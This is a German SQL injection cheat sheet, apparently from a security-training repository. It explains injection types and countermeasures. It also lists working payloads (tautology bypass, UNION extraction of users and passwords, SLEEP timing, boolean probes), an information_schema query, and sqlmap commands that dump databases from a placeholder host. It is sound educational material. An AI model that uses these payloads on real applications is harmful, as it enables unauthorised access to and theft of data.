# SQL Injection Cheat Sheet



## Inhaltsverzeichnis
- [Was ist eine SQL-Injection?](#was-ist-eine-sql-injection)
- [Grundlegende Arten von SQL-Injections](#grundlegende-arten-von-sql-injections)
- [Beispiele für SQL-Injection Payloads](#beispiele-für-sql-injection-payloads)
- [Wichtige SQL-Befehle zur Ausnutzung](#wichtige-sql-befehle-zur-ausnutzung)
- [Schutz vor SQL-Injection](#schutz-vor-sql-injection)
- [Nützliche Tools zur SQLi-Analyse](#nützliche-tools-zur-sqli-analyse)
- [Beispiel: SQL-Injection mit sqlmap](#beispiel-sql-injection-mit-sqlmap)
- [Fazit](#fazit)
- [Haftungsausschluss](#haftungsausschluss)



## Was ist eine SQL-Injection?

**SQL-Injection** (SQLi) ist eine Schwachstelle in Webanwendungen, bei der Angreifer schädlichen SQL-Code einschleusen, um mit der Datenbank zu interagieren. Ziel ist es, Daten zu lesen, ändern oder löschen, ohne Berechtigung zu haben.



## Grundlegende Arten von SQL-Injections

| Typ                   | Beschreibung                                                    |
| --------------------- | --------------------------------------------------------------- |
| Klassische SQLi       | Direkte Einspeisung in SQL-Abfrage                              |
| Blind SQLi            | Keine Fehlermeldung oder Ausgabe, aber Verhalten verändert sich |
| Time-Based Blind SQLi | Antwortzeit zeigt an, ob Abfrage erfolgreich war                |
| Union-Based SQLi      | Verwendung von UNION zur Datenabfrage                           |
| Error-Based SQLi      | Nutzt Fehlermeldungen zur Informationsgewinnung                 |



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Beispiele für SQL-Injection Payloads

### 1. Klassische Injection

```sql
' OR '1'='1
admin' --
```

### 2. Union-Based

```sql
' UNION SELECT null, username, password FROM users --
```

### 3. Time-Based (MySQL)

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

### 4. Blind SQLi (Boolean)

```sql
' AND 1=1 -- (wird akzeptiert)
' AND 1=2 -- (wird abgelehnt)
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Wichtige SQL-Befehle zur Ausnutzung

| Befehl               | Zweck                                   |
| -------------------- | --------------------------------------- |
| `SELECT`             | Daten abfragen                          |
| `UNION`              | Daten aus mehreren Abfragen kombinieren |
| `INSERT`, `UPDATE`   | Daten manipulieren                      |
| `DELETE`             | Daten löschen                           |
| `INFORMATION_SCHEMA` | Metadaten zur Datenbank anzeigen        |

Beispiel:

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
```



## Schutz vor SQL-Injection

* ✅ Prepared Statements / Parameterized Queries verwenden (z. B. `PDO`, `mysqli` in PHP)
* ✅ Eingaben validieren und escapen
* ✅ Least Privilege Prinzip in der Datenbank anwenden
* ✅ Fehlerausgaben vermeiden oder loggen
* ✅ WAF (Web Application Firewall) einsetzen



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Nützliche Tools zur SQLi-Analyse

| Tool         | Funktion                                       |
| ------------ | ---------------------------------------------- |
| `sqlmap`     | Automatisierte SQLi-Tests und Exploits         |
| `Burp Suite` | Manuelles Testen und Modifizieren von Requests |
| `ZAP`        | Open Source Scanner für Webanwendungen         |
| `DVWA`       | Testumgebung für Web Security                  |



## Beispiel: SQL-Injection mit sqlmap

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --batch --dbs
```

Weitere Beispiele:

```bash
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=admin" --dump
```



## Fazit

SQL-Injections sind eine der ältesten, aber immer noch häufigsten Sicherheitslücken im Web. Mit ausreichendem Wissen und den richtigen Tools lassen sich diese erkennen, ausnutzen und vor allem vermeiden.

**Ziel:** Erkennen, verstehen und absichern.



## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---